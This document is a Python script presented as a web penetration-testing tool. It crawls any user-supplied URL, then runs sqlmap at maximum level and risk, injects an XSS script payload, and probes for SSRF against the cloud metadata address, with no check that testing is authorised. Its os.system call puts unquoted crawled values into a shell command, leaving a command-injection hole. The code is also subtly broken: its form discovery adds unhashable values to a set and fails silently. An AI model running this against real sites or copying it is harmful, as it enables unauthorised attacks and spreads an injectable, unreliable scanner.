import os
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup


class WebPentestTool:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.endpoints = set()
        self.vulnerabilities = []

    def is_valid_url(self, url):
        """Check if a URL is valid and has a scheme."""
        return url.startswith("http://") or url.startswith("https://")

    def crawl(self, url):
        """Crawl the web application to discover endpoints."""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, "html.parser")

            # Extract all links
            for link in soup.find_all("a", href=True):
                full_url = urljoin(url, link["href"])
                if self.is_valid_url(full_url):  # Ensure the URL is valid
                    self.endpoints.add(full_url)
                    print(f"Discovered: {full_url}")

            # Extract forms
            for form in soup.find_all("form"):
                action = form.get("action")
                method = form.get("method", "GET").upper()
                inputs = form.find_all("input")
                params = {inp.get("name"): inp.get("value", "") for inp in inputs}

                # Handle relative URLs in form actions
                if action:
                    full_url = urljoin(url, action)
                    if self.is_valid_url(full_url):  # Ensure the URL is valid
                        self.endpoints.add((full_url, method, params))
                        print(f"Discovered form: {full_url} ({method})")

        except Exception as e:
            print(f"Error crawling {url}: {e}")

    def test_sql_injection(self, url, params):
        """Test for SQL injection vulnerabilities."""
        print(f"Testing SQL Injection on: {url}")
        os.system(f"sqlmap -u {url} --data={params} --batch --level=5 --risk=3")

    def test_xss(self, url, params):
        """Test for XSS vulnerabilities."""
        print(f"Testing XSS on: {url}")
        payload = "<script>alert('XSS')</script>"
        if isinstance(params, dict):  # Form endpoint
            response = self.session.post(url, data={k: payload for k in params.keys()})
        else:  # GET endpoint
            response = self.session.get(url, params={k: payload for k in params.keys()})
        if payload in response.text:
            self.vulnerabilities.append(f"XSS found at {url}")
            print(f"XSS Vulnerability Found: {url}")

    def test_ssrf(self, url):
        """Test for SSRF vulnerabilities."""
        print(f"Testing SSRF on: {url}")
        ssrf_payload = "http://169.254.169.254/latest/meta-data/"
        try:
            response = self.session.get(url, params={"url": ssrf_payload}, timeout=5)
            if "200" in str(response.status_code) and "meta-data" in response.text:
                self.vulnerabilities.append(f"SSRF found at {url}")
                print(f"SSRF Vulnerability Found: {url}")
        except Exception as e:
            print(f"Error testing SSRF on {url}: {e}")

    def generate_report(self):
        """Generate a markdown report."""
        with open("pentest_report.md", "w") as f:
            f.write("# Web Application Penetration Test Report\n\n")
            f.write("## Discovered Endpoints\n")
            for endpoint in self.endpoints:
                f.write(f"- {endpoint}\n")
            f.write("\n## Vulnerabilities Found\n")
            for vuln in self.vulnerabilities:
                f.write(f"- {vuln}\n")
        print("Report generated: pentest_report.md")

    def run(self):
        """Run the full penetration test."""
        self.crawl(self.target_url)
        for endpoint in self.endpoints:
            if isinstance(endpoint, tuple):  # Form endpoint
                url, method, params = endpoint
                if method == "POST":
                    self.test_sql_injection(url, params)
                    self.test_xss(url, params)
            else:  # GET endpoint
                self.test_xss(endpoint, {"param": "test"})  # Test for reflected XSS
                self.test_ssrf(endpoint)  # Test for SSRF
        self.generate_report()


if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    if not target_url.startswith("http"):
        target_url = (
            f"https://{target_url}"  # Default to HTTPS if no scheme is provided
        )
    tool = WebPentestTool(target_url)
    tool.run()
